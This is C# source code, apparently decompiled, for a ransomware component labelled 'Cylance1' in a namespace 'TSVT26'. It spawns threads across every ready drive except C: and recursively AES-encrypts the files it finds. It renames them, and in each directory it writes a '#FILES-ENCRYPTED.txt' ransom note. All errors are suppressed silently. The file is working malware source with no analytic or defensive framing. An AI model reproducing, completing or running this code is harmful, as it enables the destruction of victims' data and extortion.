using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;

namespace TSVT26;

internal class Cylance1
{
	public class CoreEncryption
	{
		public void encryptDirectory(string location)
		{
			try
			{
				string[] files = Directory.GetFiles(location);
				string extension;
				for (int i = 0; i < files.Length; i++)
				{
					try
					{
						extension = Path.GetExtension(files[i]);
						string fileName = Path.GetFileName(files[i]);
						if (Array.Exists(Config.validExtensions, (string E) => E != extension.ToLower()) && extension != ".kill" && fileName != "#FILES-ENCRYPTED.txt")
						{
							EL.EnceyptFile(files[i]);
							File.WriteAllLines(location + "/#FILES-ENCRYPTED.txt", Config.messages);
						}
					}
					catch
					{
					}
				}
				string[] directories = Directory.GetDirectories(location);
				for (int j = 0; j < directories.Length; j++)
				{
					encryptDirectory(directories[j]);
				}
			}
			catch (Exception)
			{
			}
		}
	}

	public class EAFLocker
	{
		public void EnceyptFile(string file)
		{
			try
			{
				if (Path.GetExtension(file) != ".kill")
				{
					string encryptPassword = Config.EncryptPassword;
					string fileName = Path.GetFileName(file);
					string? directoryName = Path.GetDirectoryName(file);
					string text = Config.fileRename.Replace("%FILE%", fileName);
					string outputfilePath = directoryName + "\\" + text;
					Encrypt(file, outputfilePath, encryptPassword);
				}
			}
			catch
			{
			}
		}

		private void Encrypt(string inputFilePath, string outputfilePath, string EncryptionKey)
		{
			try
			{
				byte[] inArray = null;
				string text = "<THIS_FILE_ENCRYPTED>";
				byte[] bytes = Encoding.UTF8.GetBytes(EncryptionKey);
				using (BinaryReader binaryReader = new BinaryReader(File.Open(inputFilePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None)))
				{
					binaryReader.BaseStream.Position = 0L;
					inArray = AES_Encrypt(binaryReader.ReadBytes(10000000), bytes);
				}
				using (BinaryWriter binaryWriter = new BinaryWriter(File.Open(inputFilePath, FileMode.Open, FileAccess.ReadWrite, FileShare.None)))
				{
					binaryWriter.BaseStream.Position = 0L;
					binaryWriter.Write(text + Convert.ToBase64String(inArray) + text);
				}
				File.Move(inputFilePath, outputfilePath);
			}
			catch
			{
				File.Move(inputFilePath, outputfilePath);
			}
		}

		private byte[] AES_Encrypt(byte[] bytesToBeEncrypted, byte[] passwordBytes)
		{
			byte[] array = null;
			byte[] salt = new byte[13]
			{
				73, 118, 97, 110, 32, 77, 101, 100, 118, 101,
				100, 101, 118
			};
			using MemoryStream memoryStream = new MemoryStream();
			using AesCryptoServiceProvider aesCryptoServiceProvider = new AesCryptoServiceProvider();
			Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1);
			aesCryptoServiceProvider.KeySize = 256;
			aesCryptoServiceProvider.BlockSize = 128;
			aesCryptoServiceProvider.Key = rfc2898DeriveBytes.GetBytes(32);
			aesCryptoServiceProvider.IV = rfc2898DeriveBytes.GetBytes(16);
			aesCryptoServiceProvider.Mode = CipherMode.CBC;
			aesCryptoServiceProvider.Padding = PaddingMode.PKCS7;
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aesCryptoServiceProvider.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(bytesToBeEncrypted, 0, bytesToBeEncrypted.Length);
				cryptoStream.Close();
			}
			return memoryStream.ToArray();
		}
	}

	public static EAFLocker EL;

	public static CoreEncryption CE;

	public static void Start()
	{
		EL = new EAFLocker();
		CE = new CoreEncryption();
		new Thread((ThreadStart)delegate
		{
			LookForDirectories();
		}).Start();
	}

	private static void LookForDirectories()
	{
		try
		{
			List<string> list = new List<string>
			{
				"Q:\\", "W:\\", "E:\\", "R:\\", "T:\\", "Y:\\", "U:\\", "I:\\", "O:\\", "P:\\",
				"A:\\", "S:\\", "D:\\", "F:\\", "G:\\", "H:\\", "J:\\", "K:\\", "L:\\", "Z:\\",
				"X:\\", "V:\\", "B:\\", "N:\\", "M:\\"
			};
			DriveInfo[] drives = DriveInfo.GetDrives();
			foreach (DriveInfo driveInfo in drives)
			{
				try
				{
					if (driveInfo.Name != "C:\\" && driveInfo.IsReady)
					{
						if (list.Contains(driveInfo.Name))
						{
							list.Remove(driveInfo.Name);
						}
						new Thread((ThreadStart)delegate
						{
							CE.encryptDirectory(driveInfo.ToString());
						}).Start();
					}
				}
				catch
				{
				}
			}
			foreach (string drive in list)
			{
				try
				{
					if (drive != "C:\\" && Directory.Exists(drive))
					{
						new Thread((ThreadStart)delegate
						{
							CE.encryptDirectory(drive);
						}).Start();
					}
				}
				catch
				{
				}
			}
		}
		catch
		{
		}
	}
}
